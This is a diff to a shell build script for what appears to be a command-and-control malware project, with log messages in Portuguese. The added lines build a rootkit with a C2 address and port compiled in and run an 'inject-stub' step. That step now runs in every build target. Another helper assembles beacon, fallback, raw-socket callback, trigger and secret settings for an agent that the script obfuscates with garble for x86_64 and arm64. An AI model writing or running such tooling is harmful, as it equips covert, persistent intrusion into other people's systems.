@@ -41,8 +41,26 @@ TARGET="${1:-default}"
 
 cd "${REPO_ROOT}/agent"
 
+_build_rootkit_and_stub() {
+    log "Rootkit x86_64..."
+    make rootkit C2_IP="${RELAY_IP}" C2_PORT="${C2_PORT}"
+    log "Inject stub..."
+    make inject-stub
+}
+
+_make_args() {
+    echo "SERVER=${RELAY_IP}:${C2_PORT} \
+FALLBACK=${RELAY_IP}:${C2_PORT} \
+RAWSOCK_CB=${RELAY_IP}:${C2_PORT} \
+KCC_ADDR=${RELAY_IP}:${KCC_PORT} \
+TRIGGER=${TRIGGER} \
+INTERVAL=${BEACON_INTERVAL} \
+SECRET=${SECRET}"
+}
+
 case "$TARGET" in
     agent)
+        _build_rootkit_and_stub
         log "Garble agent x86_64 + arm64..."
         make garble-agent \
             SERVER="${RELAY_IP}:${C2_PORT}" \
@@ -69,6 +87,7 @@ case "$TARGET" in
         ;;
 
     all)
+        _build_rootkit_and_stub
         log "Build completo (não garble)..."
         make lab \
             RELAY="${RELAY_IP}" \
@@ -88,6 +107,8 @@ case "$TARGET" in
 
     default)
         log "Build padrão: garble agent + servidor arm64..."
+
+        _build_rootkit_and_stub
 
         log "1/2 — Garble agent x86_64 + arm64..."
         make garble-agent \
